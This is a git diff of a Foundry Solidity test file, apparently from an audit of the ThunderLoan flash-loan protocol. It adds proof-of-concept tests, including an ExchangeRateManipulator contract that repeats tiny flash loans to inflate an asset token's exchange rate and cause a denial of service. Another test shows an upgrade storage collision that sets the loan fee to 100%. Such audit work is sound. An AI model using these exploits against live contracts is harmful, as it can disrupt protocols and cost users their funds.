@@ -2,18 +2,20 @@
 pragma solidity ^0.8.20;
 
 import {Test, console, console2} from "forge-std/Test.sol";
-import {ThunderLoan} from "../../src/protocol/ThunderLoan.sol";
+import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
+import {
+    ThunderLoanUpgraded
+} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
 import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
-import {MockTSwapPool} from "../mocks/MockTSwapPool.sol";
-import {MockPoolFactory} from "../mocks/MockPoolFactory.sol";
+import {MockTSwapPool} from "./mocks/MockTSwapPool.sol";
+import {MockPoolFactory} from "./mocks/MockPoolFactory.sol";
 import {
     ERC1967Proxy
 } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-import {AssetToken} from "../../src/protocol/AssetToken.sol";
-import {IFlashLoanReceiver} from "../../src/interfaces/IFlashLoanReceiver.sol";
-import {IThunderLoan} from "../../src/interfaces/IThunderLoan.sol";
-import {IThunderLoanFixed} from "../../src/interfaces/IThunderLoanFixed.sol";
+import {AssetToken} from "../src/protocol/AssetToken.sol";
+import {IFlashLoanReceiver} from "../src/interfaces/IFlashLoanReceiver.sol";
+import {IThunderLoanFixed} from "../src/interfaces/IThunderLoanFixed.sol";
 
 contract ERC20Mock6Decimals is ERC20Mock {
     uint8 private immutable i_decimals;
@@ -262,7 +264,136 @@ contract POCtest is Test {
         );
         tokenA.mint(address(receiverContract), 100 * 10 ** tokenA.decimals()); // fund receiverContract with tokenA to pay fee
 
-        receiverContract.requestFlashLoan(address(tokenA));
+        receiverContract.requestFlashLoan(
+            address(tokenA),
+            1 * 10 ** tokenA.decimals()
+        ); // request flash loan of 1 tokenA
+        vm.stopPrank();
+    }
+
+    function testDOSattackDueToExchangeRateManipulationWithFlashLoan() public {
+        // This test use Basetest.t.sol setup
+        uint256 mintToAttacker = 1 * 10 ** tokenA.decimals();
+        tokenA.mint(flashLoanAttacker, mintToAttacker); // fund attacker with tokenA
+
+        assetTokenA = thunderLoan.setAllowedToken(
+            IERC20(address(tokenA)),
+            true
+        );
+
+        assertEq(tokenA.balanceOf(address(assetTokenA)), 0);
+        assertEq(assetTokenA.totalSupply(), 0);
+        assertEq(assetTokenA.getExchangeRate(), 1e18); //1:1 exchange rate at the beginning
+
+        // Attacker deposits tokenA and gets assetTokenA
+        vm.startPrank(flashLoanAttacker);
+        ExchangeRateManipulator manipulator = new ExchangeRateManipulator(
+            address(thunderLoan)
+        );
+        tokenA.transfer(address(manipulator), mintToAttacker);
+        manipulator.manipulateExchangeRate(address(tokenA));
+
+        assertGt(
+            assetTokenA.getExchangeRate(),
+            100e18,
+            "Exchange rate should have increased after manipulation"
+        );
+    }
+
+    function testDOSdueToupgradeImplementationAndSettingFeesAtOneUndredPercent()
+        public
+    {
+        // SETUP: allow tokenA and fund the depositer
+        assetTokenA = thunderLoan.setAllowedToken(
+            IERC20(address(tokenA)),
+            true
+        );
+
+        vm.startPrank(depositer);
+        tokenA.approve(address(thunderLoan), 50000e18);
+        thunderLoan.deposit(IERC20(address(tokenA)), 50000e18);
+        vm.stopPrank();
+
+        // STEP 1: verify fee BEFORE upgrade → should be 0.3%
+        uint256 borrowAmount = 1000e18;
+        uint256 feeBefore = thunderLoan.getCalculatedFee(
+            IERC20(address(tokenA)),
+            borrowAmount
+        );
+        uint256 feeRawBefore = thunderLoan.getFee(); // should be 3e15
+
+        console.log("=== BEFORE UPGRADE ===");
+        console.log("s_flashLoanFee slot value : ", feeRawBefore); // 3e15
+        console.log("Calculated fee on 1000e18 : ", feeBefore); // ~3e15
+
+        assertEq(feeRawBefore, 3e15);
+
+        // STEP 2: upgrade to ThunderLoanUpgraded
+        ThunderLoanUpgraded thunderLoanUpgradedImplementation = new ThunderLoanUpgraded();
+
+        vm.prank(thunderLoan.owner());
+        thunderLoan.upgradeTo(address(thunderLoanUpgradedImplementation));
+
+        // Cast proxy to upgraded interface
+        ThunderLoanUpgraded thunderLoanUpgraded = ThunderLoanUpgraded(
+            address(proxy)
+        );
+
+        // STEP 3: verify fee AFTER upgrade → reads s_feePrecision (1e18) instead of s_flashLoanFee (3e15) due to storage collision
+        uint256 feeRawAfter = thunderLoanUpgraded.getFee(); // reads wrong slot
+        uint256 feeAfter = thunderLoanUpgraded.getCalculatedFee(
+            IERC20(address(tokenA)),
+            borrowAmount
+        );
+
+        console.log("=== AFTER UPGRADE ===");
+        console.log("s_flashLoanFee slot value : ", feeRawAfter); // 1e18 ← collision
+        console.log("Calculated fee on 1000e18 : ", feeAfter); // = borrowAmount
+
+        // Storage collision: s_flashLoanFee now reads old s_feePrecision = 1e18
+        assertEq(feeRawAfter, 1e18);
+        // Fee is now 100% of borrowed amount, not 0.3%
+        assertNotEq(feeAfter, feeBefore);
+        assertEq(feeAfter, borrowAmount);
+
+    }
+}
+
+contract ExchangeRateManipulator {
+    ThunderLoan private immutable i_thunderLoan;
+
+    constructor(address thunderLoan) {
+        i_thunderLoan = ThunderLoan(thunderLoan);
+    }
+
+    function manipulateExchangeRate(address token) external {
+        AssetToken assetToken = i_thunderLoan.s_tokenToAssetToken(
+            IERC20(token)
+        );
+        IERC20(token).approve(address(i_thunderLoan), type(uint256).max);
+        // deposit minimum viable amount to minimize totalSupply
+        // minimum to avoid fee rounding to zero: ceil(1e18 / 3e15) = 334 wei
+        uint256 minDeposit = 334;
+        i_thunderLoan.deposit(IERC20(token), minDeposit);
+        uint256 flashLoanAmount = IERC20(token).balanceOf(address(assetToken)); // = 334 wei
+        for (uint256 i = 0; i < 1540; i++) {
+            i_thunderLoan.flashloan(
+                address(this),
+                IERC20(token),
+                flashLoanAmount,
+                ""
+            );
+        }
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address initiator,
+        bytes calldata params
+    ) external {
+        i_thunderLoan.repay(IERC20(token), amount + fee);
     }
 }
 
@@ -274,16 +405,11 @@ contract FlashLoanReceiver {
     }
 
     //amount 1
-    function requestFlashLoan(address _underlyingToken) external {
-        uint256 flashLoanAmount = 1 *
-            10 ** ERC20Mock(_underlyingToken).decimals();
-
-        i_thunderLoan.flashloan(
-            address(this),
-            _underlyingToken,
-            flashLoanAmount,
-            ""
-        );
+    function requestFlashLoan(
+        address _underlyingToken,
+        uint256 amount
+    ) external {
+        i_thunderLoan.flashloan(address(this), _underlyingToken, amount, "");
     }
 
     function executeOperation(
